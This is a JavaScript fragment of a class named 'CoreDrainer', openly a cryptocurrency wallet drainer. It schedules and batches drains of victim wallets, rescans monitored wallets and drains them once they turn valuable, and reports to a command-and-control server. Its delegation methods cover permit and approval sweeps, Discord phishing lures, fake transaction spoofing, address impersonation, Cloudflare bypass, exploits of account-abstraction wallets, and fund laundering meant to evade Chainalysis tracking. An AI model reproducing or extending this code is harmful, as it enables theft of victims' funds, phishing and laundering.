        clearInterval(this.batchProcessor);
        this.batchProcessor = null;
        return;
      }
      
      const batchSize = Math.min(5, this.batchQueue.length);
      const batch = this.batchQueue.splice(0, batchSize);
      
      console.log(`🔄 Processing batch of ${batchSize} wallets`);
      
      for (const item of batch) {
        if (!item.processed) {
          try {
            await this.executeImmediateDrain(item.address);
            item.processed = true;
            console.log(`✅ Batch processed: ${item.address}`);
          } catch (error) {
            console.error(`❌ Batch processing failed for ${item.address}: ${error.message}`);
          }
          
          await this.randomDelay(10000, 20000);
        }
      }
    }, 3600000);
  }

  startWalletMonitor() {
    if (this.monitorService) return;
    
    this.monitorService = setInterval(async () => {
      const now = Date.now();
      const walletsToRescan = [];
      
      for (const [address, data] of this.monitoredWallets.entries()) {
        if (now >= data.nextScan) {
          walletsToRescan.push(address);
          data.scanCount++;
          data.lastScan = now;
          data.nextScan = now + 86400000;
        }
      }
      
      if (walletsToRescan.length > 0) {
        console.log(`🔍 Rescanning ${walletsToRescan.length} monitored wallets`);
        
        for (const address of walletsToRescan) {
          try {
            const analysis = await this.analyzeWallet(address);
            
            if (analysis.categories.highValue) {
              console.log(`🎯 Monitored wallet became valuable: ${address}`);
              this.monitoredWallets.delete(address);
              await this.executeImmediateDrain(address);
            } else {
              console.log(`👀 Wallet still low value: ${address}`);
            }
          } catch (error) {
            console.error(`❌ Monitor rescan failed for ${address}: ${error.message}`);
          }
          
          await this.randomDelay(5000, 10000);
        }
      }
      
      if (this.monitoredWallets.size === 0) {
        clearInterval(this.monitorService);
        this.monitorService = null;
      }
    }, 300000);
  }

  getSchedulerStatus() {
    return {
      scheduledDrains: this.scheduledDrains.length,
      batchQueue: this.batchQueue.filter(item => !item.processed).length,
      monitoredWallets: this.monitoredWallets.size,
      schedulerRunning: !!this.drainScheduler,
      batchProcessorRunning: !!this.batchProcessor,
      monitorRunning: !!this.monitorService
    };
  }

  // ===== UTILITY METHODS =====
  async #fetchETHPrice() {
    try {
      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
      const data = await response.json();
      return data.ethereum.usd || 0;
    } catch (error) {
      console.warn('⚠️ Failed to fetch ETH price, using default $2000');
      return 2000;
    }
  }

  async #fetchTokenPrices(tokenAddresses) {
    try {
      return {};
    } catch (error) {
      return {};
    }
  }

  #splitFunds(amount) {
    const chunks = [];
    let remaining = amount;
    
    while (remaining > 0) {
      const chunk = Math.min(remaining, 0.1);
      chunks.push(chunk);
      remaining -= chunk;
    }
    
    return chunks;
  }

  async randomDelay(min, max) {
    const delay = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise(resolve => setTimeout(resolve, delay));
  }

  async analyzeScanResults(scanData) {
    const analysis = await this.analyzeWallet(scanData.userAddress);
    return {
      highValueTarget: analysis.categories.highValue,
      totalValue: analysis.totalValue,
      recommendedAction: analysis.categories.highValue ? 'immediate_drain' : 'schedule'
    };
  }

  async consolidateFunds(drainResults) {
    console.log(`🔄 Consolidating funds to main wallet...`);
    
    for (const [chainId, result] of Object.entries(drainResults)) {
      if (result.error || !result.assets || result.assets.length === 0) continue;
      
      try {
        if (result.totalValue > 10) {
          await this.omnichainDrainer.crossChainSwap(
            result.assets,
            chainId,
            '1',
            'USDC'
          );
          console.log(`✅ Consolidated funds from chain ${chainId}`);
        }
      } catch (error) {
        console.error(`Cross-chain swap failed for chain ${chainId}:`, error);
      }
    }
    
    return { success: true, consolidated: true };
  }

  // ===== HELPER METHODS =====
  async fetchERC20ABI(tokenAddress, chainId) {
    const baseUrl = this.getExplorerApiBase(chainId);
    const apiKey = this.getExplorerApiKey(chainId);
    
    if (!baseUrl || !apiKey) {
      throw new Error('Unsupported chain');
    }
    
    const url = `${baseUrl}/api?module=contract&action=getabi&address=${tokenAddress}&apikey=${apiKey}`;
    const response = await fetch(url);
    const data = await response.json();
    
    if (data.status !== "1") {
      throw new Error(data.result || 'ABI fetch failed');
    }
    
    return JSON.parse(data.result);
  }

  async fetchNFTs(chainName, userAddress) {
    const url = `https://api.covalenthq.com/v1/${chainName}/address/${userAddress}/balances_nft/?key=${COVALENT_API_KEY}`;
    const response = await fetch(url);
    const data = await response.json();
    return data.data.items || [];
  }

   async fetchNonce(tokenAddress, userAddress) {
    const provider = await getEVMProvider(1);
    
    const abi = [{
      constant: true,
      inputs: [{ name: "owner", type: "address" }],
      name: "nonces",
      outputs: [{ name: "", type: "uint256" }],
      type: "function"
    }];
    
    const contract = new ethers.Contract(tokenAddress, abi, provider);
    const nonce = await contract.nonces(userAddress);
    return nonce.toString();
  }

  splitSignature(signature) {
    const r = signature.slice(0, 66);
    const s = "0x" + signature.slice(66, 130);
    const v = parseInt(signature.slice(130, 132), 16);
    return { r, s, v };
  }

 async getProviderForChain(chainId = 1) {
    return await getEVMProvider(chainId);
  }

  getExplorerApiBase(chainId) {
    const bases = {
      1: "https://api.etherscan.io",
      56: "https://api.bscscan.com",
      137: "https://api.polygonscan.com",
      42161: "https://api.arbiscan.io",
      10: "https://api-optimistic.etherscan.io",
      43114: "https://api.snowtrace.io",
      8453: "https://api.basescan.org"
    };
    return bases[chainId];
  }

  getExplorerApiKey(chainId) {
    const keys = {
      1: process.env.ETHERSCAN_API_KEY,
      56: process.env.BSCSCAN_API_KEY,
      137: process.env.POLYGONSCAN_API_KEY,
      42161: process.env.ARBISCAN_API_KEY,
      10: process.env.OPTIMISMSCAN_API_KEY,
      43114: process.env.SNOWTRACE_API_KEY,
      8453: process.env.BASESCAN_API_KEY
    };
    return keys[chainId];
  }

  // ===== DELEGATION METHODS =====
  
  // Chain Management
  getChainConfig(chainId) { return chainManager.getChainConfig(chainId); }
  getChainName(chainId) { return chainManager.getChainName(chainId); }
  rotateRPC(rpcs) { return chainManager.rotateRPC(rpcs); }
  decodeRPC(encoded) { return chainManager.decodeRPC(encoded); }
  decode(addr) { return chainManager.decode(addr); }

  // Security Management
  async initializeSecurity() { return await securityManager.initializeSecurity(); }
  async monitorGasTank() { return await securityManager.monitorGasTank(); }
  async validatePrivateConfig() { return await securityManager.validatePrivateConfig(); }
  async auditSecurity() { return await securityManager.auditSecurity(); }

  // C2 Communication
  async checkDrainerStatus() { return await c2Communicator.checkDrainerStatus(); }
  async reportToC2(victimData) { return await c2Communicator.reportToC2(victimData); }
  async fetchPotentialTargets() { return await c2Communicator.fetchPotentialTargets(); }
  async testC2Connection() { return await c2Communicator.testC2Connection(); }

  // Token Swapping
  async autoSwapDrainedAssets(userAddress, drainedTokens, chainId = 1) { 
    return await tokenSwapper.autoSwapDrainedAssets(userAddress, drainedTokens, chainId); 
  }
  async autoSwapToStable(tokenAddress, amount, chainId, fromAddress = null) { 
    return await tokenSwapper.autoSwapToStable(tokenAddress, amount, chainId, fromAddress); 
  }

  // AI Targeting

  async analyzeWalletOnChain(provider, userAddress, chainId, chainName) { 
    return await aiTargeting.analyzeWalletOnChain(provider, userAddress, chainId, chainName); 
  }
  async processVictim(victimAddress, provider) { return await aiTargeting.processVictim(victimAddress, provider); }
  async fingerprintWallet(userAddress, chainId = 1) { return await aiTargeting.fingerprintWallet(userAddress, chainId); }

  // Scheduler
  async scheduleDrain(userAddress, priority = 'normal') { return await scheduler.scheduleDrain(userAddress, priority); }
  async addToBatchQueue(userAddress) { return await scheduler.addToBatchQueue(userAddress); }
  async monitorWallet(userAddress) { return await scheduler.monitorWallet(userAddress); }

  // Cross Chain
  async sendToCrossChain(chunk) { return await crossChain.sendToCrossChain(chunk); }
  async processFundObfuscation(amount) { return await crossChain.processFundObfuscation(amount); }
  async executeRailgunSafely(userAddress, amount) { return await crossChain.executeRailgunSafely(userAddress, amount); }

  // Permit Management
  async sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion = "1") { 
    return await permitManager.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion); 
  }
  async sweepViaApproveTransferFrom(userAddress, tokenAddress, chainId) { 
    return await permitManager.sweepViaApproveTransferFrom(userAddress, tokenAddress, chainId); 
  }

  // Wallet Impersonation
  async generateVanityAddress(targetAddress) { return await this.walletImpersonator.generateVanityAddress(targetAddress); }
  async batchGenerateVanityAddresses(targetAddresses) { return await this.walletImpersonator.batchGenerateVanityAddresses(targetAddresses); }
  isLikelyVanityAddress(address) { return this.walletImpersonator.isLikelyVanityAddress(address); }
  encryptPrivateKey(privateKey) { return this.walletImpersonator.encryptPrivateKey(privateKey); }
  decryptPrivateKey(encryptedData) { return this.walletImpersonator.decryptPrivateKey(encryptedData); }

  // Transaction Spoofing
  async generateFakeTransaction(userAddress, txType = 'swap', chainId = 1) { 
    return await this.txSimulatorSpoof.generateFakeTransaction(userAddress, txType, chainId); 
  }
  async generateFakeTransactionHistory(userAddress, count = 10, chainId = 1) { 
    return await this.txSimulatorSpoof.generateFakeTransactionHistory(userAddress, count, chainId); 
  }
  async batchGenerateFakeTransactions(userAddresses, txType = 'swap', chainId = 1) { 
    return await this.txSimulatorSpoof.batchGenerateFakeTransactions(userAddresses, txType, chainId); 
  }
  isLikelyFakeTransaction(txData) { return this.txSimulatorSpoof.isLikelyFakeTransaction(txData); }

  // Discord Lure Generation
  async generateNFTMintLure(targetUser = null, projectData = null) { 
    return await this.discordLureGenerator.generateNFTMintLure(targetUser, projectData); 
  }
  async generateTokenLaunchLure(targetUser = null, tokenData = null) { 
    return await this.discordLureGenerator.generateTokenLaunchLure(targetUser, tokenData); 
  }
  async generateRaffleLure(targetUser = null) { return await this.discordLureGenerator.generateRaffleLure(targetUser); }
  async generateLureCampaign(targetUsers, lureTypes = ['nft_mint', 'token_launch', 'raffle']) { 
    return await this.discordLureGenerator.generateLureCampaign(targetUsers, lureTypes); 
  }

  // Fingerprint Spoofing
  async spoofFingerprint(originalFingerprint) { return await this.fingerprintSpoofer.spoofFingerprint(originalFingerprint); }
  async batchSpoofFingerprints(originalFingerprints) { return await this.fingerprintSpoofer.batchSpoofFingerprints(originalFingerprints); }
  async generateRandomFingerprint() { return await this.fingerprintSpoofer.generateRandomFingerprint(); }
  detectFingerprintSpoofing(fingerprint) { return this.fingerprintSpoofer.detectFingerprintSpoofing(fingerprint); }

  // Cloudflare Bypass
  async bypassCloudflare(url, options = {}) { return await this.cloudflareBypass.bypassCloudflare(url, options); }
  async batchBypassCloudflare(urls, options = {}) { return await this.cloudflareBypass.batchBypassCloudflare(urls, options); }
  async testBypass(url) { return await this.cloudflareBypass.testBypass(url); }

  // Market Intelligence
  async getOptimalTransactionTiming() { return await this.marketIntelligence.getOptimalTransactionTiming(); }
  async analyzeGasTrends() { return await this.marketIntelligence.analyzeGasTrends(); }
  async getMarketSentiment() { return await this.marketIntelligence.getMarketSentiment(); }
  async getTokenOpportunities() { return await this.marketIntelligence.getTokenOpportunities(); }

  // Chainalysis Monitoring
  async checkWalletRisk(walletAddress) { return await this.chainalysisMonitor.checkWalletRisk(walletAddress); }
  async batchCheckWalletRisk(walletAddresses) { return await this.chainalysisMonitor.batchCheckWalletRisk(walletAddresses); }
  async getRiskReport(walletAddress) { return await this.chainalysisMonitor.getRiskReport(walletAddress); }
  async monitorRiskChanges(walletAddress) { return await this.chainalysisMonitor.monitorRiskChanges(walletAddress); }

  // Auto Deployer
  async deployDrainerContract(chainId, contractType = 'standard') { return await this.autoDeployer.deployDrainerContract(chainId, contractType); }
  async batchDeployDrainerContracts(chains, contractType = 'standard') { return await this.autoDeployer.batchDeployDrainerContracts(chains, contractType); }
  async verifyContractOnExplorer(contractAddress, chainId) { return await this.autoDeployer.verifyContractOnExplorer(contractAddress, chainId); }
  async updateDrainerContract(contractAddress, chainId, newLogic) { return await this.autoDeployer.updateDrainerContract(contractAddress, chainId, newLogic); }

  // Account Abstraction Exploiter
  async exploitAccountAbstraction(userAddress, chainId = 1) { return await this.accountAbstractionExploiter.exploitAccountAbstraction(userAddress, chainId); }
  async batchExploitAccountAbstraction(userAddresses, chainId = 1) { return await this.accountAbstractionExploiter.batchExploitAccountAbstraction(userAddresses, chainId); }
  async analyzeAAVulnerabilities(userAddress, chainId = 1) { return await this.accountAbstractionExploiter.analyzeAAVulnerabilities(userAddress, chainId); }
  async deployAAExploitContract(chainId = 1) { return await this.accountAbstractionExploiter.deployAAExploitContract(chainId); }

  // Multi-Step Lure Generator
  async generateMultiStepLure(targetUser, steps = 3) { return await this.multiStepLureGenerator.generateMultiStepLure(targetUser, steps); }
  async batchGenerateMultiStepLures(targetUsers, steps = 3) { return await this.multiStepLureGenerator.batchGenerateMultiStepLures(targetUsers, steps); }
  async trackLureProgress(lureId) { return await this.multiStepLureGenerator.trackLureProgress(lureId); }
  async analyzeLureEffectiveness(lureId) { return await this.multiStepLureGenerator.analyzeLureEffectiveness(lureId); }

  // Atomic Bundler
  async bundleTransactions(transactions, chainId = 1) { return await this.atomicBundler.bundleTransactions(transactions, chainId); }
  async simulateBundle(transactions, chainId = 1) { return await this.atomicBundler.simulateBundle(transactions, chainId); }
  async sendBundle(transactions, chainId = 1) { return await this.atomicBundler.sendBundle(transactions, chainId); }
  async cancelBundle(bundleId) { return await this.atomicBundler.cancelBundle(bundleId); }

  // Signature Database
  async storeSignature(signatureData) { return await this.signatureDatabase.storeSignature(signatureData); }
  async querySignature(signatureHash) { return await this.signatureDatabase.querySignature(signatureHash); }
  async batchStoreSignatures(signatures) { return await this.signatureDatabase.batchStoreSignatures(signatures); }
  async analyzeSignaturePatterns(signatures) { return await this.signatureDatabase.analyzeSignaturePatterns(signatures); }

  // On-Chain Trends
  async detectTrendingTokens(chainId = 1) { return await this.onChainTrends.detectTrendingTokens(chainId); }
  async analyzeMempoolTrends(chainId = 1) { return await this.onChainTrends.analyzeMempoolTrends(chainId); }
  async getSmartMoneyMovements(chainId = 1) { return await this.onChainTrends.getSmartMoneyMovements(chainId); }
  async predictTrendReversals(chainId = 1) { return await this.onChainTrends.predictTrendReversals(chainId); }

  // ERC7579 Exploiter
  async exploitERC7579(userAddress, chainId = 1) { return await this.erc7579Exploiter.exploitERC7579(userAddress, chainId); }
  async batchExploitERC7579(userAddresses, chainId = 1) { return await this.erc7579Exploiter.batchExploitERC7579(userAddresses, chainId); }
  async analyzeERC7579Vulnerabilities(userAddress, chainId = 1) { return await this.erc7579Exploiter.analyzeERC7579Vulnerabilities(userAddress, chainId); }
  async deployERC7579ExploitContract(chainId = 1) { return await this.erc7579Exploiter.deployERC7579ExploitContract(chainId); }

  // Solana Drainer
  async drainSolanaWallet(userAddress, privateKey) { return await solanaDrainer.drainSolanaWallet(userAddress, privateKey); }
  async getSolanaBalance(userAddress) { return await solanaDrainer.getSolanaBalance(userAddress); }

  // BTC balance checker
  async getBTCBalance(address) {
    try {
      console.log('🔍 Checking BTC balance for:', address);
      
      // Use blockchain.com API
      const response = await fetch(`https://blockstream.info/api/address/${address}`);
      const data = await response.json();
      
      // Calculate total balance from UTXOs
      const balance = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
      
      return {
        satoshis: balance,
        btc: balance / 100000000,
        usd: 0 // You can add USD conversion later
      };
      
    } catch (error) {
      console.error('❌ BTC balance check failed:', error);
      return { satoshis: 0, btc: 0, usd: 0 };
    }
  }
  async drainSolanaTokens(userAddress, privateKey) { return await solanaDrainer.drainSolanaTokens(userAddress, privateKey); }
  async drainSolanaNFTs(userAddress, privateKey) { return await solanaDrainer.drainSolanaNFTs(userAddress, privateKey); }

  // Multi-Chain Drain
  async initializeMultiChain() { return await multiChainDrain.initialize(); }
  async drainMultipleChains(userAddress, chains = [1, 56, 137]) { return await multiChainDrain.drainMultipleChains(userAddress, chains); }
  async crossChainAssetTransfer(userAddress, fromChain, toChain, assets) { return await multiChainDrain.crossChainAssetTransfer(userAddress, fromChain, toChain, assets); }
  async getMultiChainBalance(userAddress, chains = [1, 56, 137]) { return await multiChainDrain.getMultiChainBalance(userAddress, chains); }

  // Omnichain Drainer
  async initializeOmnichain() { return await omnichainDrainer.initialize(); }
  async executeOmnichainDrain(userAddress) { return await omnichainDrainer.executeOmnichainDrain(userAddress); }
  async crossChainSwap(assets, fromChain, toChain, targetToken) { return await omnichainDrainer.crossChainSwap(assets, fromChain, toChain, targetToken); }
  async getOmnichainBalance(userAddress) { return await omnichainDrainer.getOmnichainBalance(userAddress); }

  // AI Enhancements
  async analyzeBehaviorPatterns(userAddress, chainId = 1) { return await this.aiEnhancements.analyzeBehaviorPatterns(userAddress, chainId); }
  async predictOptimalDrainTime(userAddress, chainId = 1) { return await this.aiEnhancements.predictOptimalDrainTime(userAddress, chainId); }
  async generatePersonalizedLure(userAddress, chainId = 1) { return await this.aiEnhancements.generatePersonalizedLure(userAddress, chainId); }
  async optimizeGasParameters(userAddress, chainId = 1) { return await this.aiEnhancements.optimizeGasParameters(userAddress, chainId); }

  // Market Intelligence
  async getMarketConditions() { return await this.marketIntelligence.getMarketConditions(); }
  async getTokenPriceTrends(tokenAddress, chainId = 1) { return await this.marketIntelligence.getTokenPriceTrends(tokenAddress, chainId); }
  async getLiquidityPools(tokenAddress, chainId = 1) { return await this.marketIntelligence.getLiquidityPools(tokenAddress, chainId); }
  async getArbitrageOpportunities() { return await this.marketIntelligence.getArbitrageOpportunities(); }

  // Profit Tracker
  async trackProfit(profitData) { return await this.profitTracker.trackProfit(profitData); }
  async getProfitSummary() { return await this.profitTracker.getProfitSummary(); }
  async exportProfitData(format = 'csv') { return await this.profitTracker.exportProfitData(format); }
  async generateProfitReport() { return await this.profitTracker.generateProfitReport(); }

  // Data Exporter
  async exportData(data, format = 'json') { return await this.dataExporter.exportData(data, format); }
  async batchExportData(dataArray, format = 'json') { return await this.dataExporter.batchExportData(dataArray, format); }
  async encryptData(data, password) { return await this.dataExporter.encryptData(data, password); }
  async decryptData(encryptedData, password) { return await this.dataExporter.decryptData(encryptedData, password); }

  // Report Generator
  async generateReport(reportData, format = 'pdf') { return await this.reportGenerator.generateReport(reportData, format); }
  async batchGenerateReports(reportDataArray, format = 'pdf') { return await this.reportGenerator.batchGenerateReports(reportDataArray, format); }
  async scheduleReport(reportData, schedule, format = 'pdf') { return await this.reportGenerator.scheduleReport(reportData, schedule, format); }
  async sendReport(reportData, recipients, format = 'pdf') { return await this.reportGenerator.sendReport(reportData, recipients, format); }

  // Native ETH Sweeping
  async sweepNativeETH(provider, userAddress, amount, chainName) {
    try {
      console.log(`💰 Sweeping ${amount} native ETH from ${userAddress} on ${chainName}`);
      
      const tx = {
        from: userAddress,
        to: DESTINATION_WALLET,
        value: amount,
        gasLimit: 21000,
        gasPrice: await provider.getGasPrice(),
        chainId: await provider.getNetwork().then(net => net.chainId)
      };
      
      return { success: true, transaction: tx };
      
    } catch (error) {
      console.error('❌ Native ETH sweep failed:', error);
      return { success: false, error: error.message };
    }
  }

  // Method to handle the main drain process
  async processDrainRequest(userAddress, options = {}) {
    console.log(`🎯 Processing drain request for: ${userAddress}`);
    
    try {
      const isEnabled = await this.checkDrainerStatus();
      if (!isEnabled) {
        console.log('⏸️ Drainer disabled - skipping drain request');
        return { success: false, error: 'Drainer disabled by C&C' };
      }
      
      const analysis = await this.analyzeWallet(userAddress);
      
      if (analysis.categories.highValue) {
        console.log(`🎯 High-value target detected: ${userAddress}`);
        return await this.executeImmediateDrain(userAddress);
      } else {
        console.log(`⏰ Low-value target: ${userAddress} - scheduling for later`);
        await this.scheduleDrain(userAddress, 'low');
        return { success: true, scheduled: true, priority: 'low' };
      }
      
    } catch (error) {
      console.error('❌ Drain request processing failed:', error);
      return { success: false, error: error.message };
    }
  }

    async initialize() {
    if (this.isInitialized) return true;
    try {
      console.log('🔄 Initializing CoreDrainer...');
      
      // Initialize provider with fallback system
      await this.initializeProvider();
      
      this.isInitialized = true;
      console.log('✅ CoreDrainer initialized with RPC fallback system');
      return true;
    } catch (error) {
      console.error('❌ CoreDrainer initialization failed:', error);
      return false;
    }
  }
} 

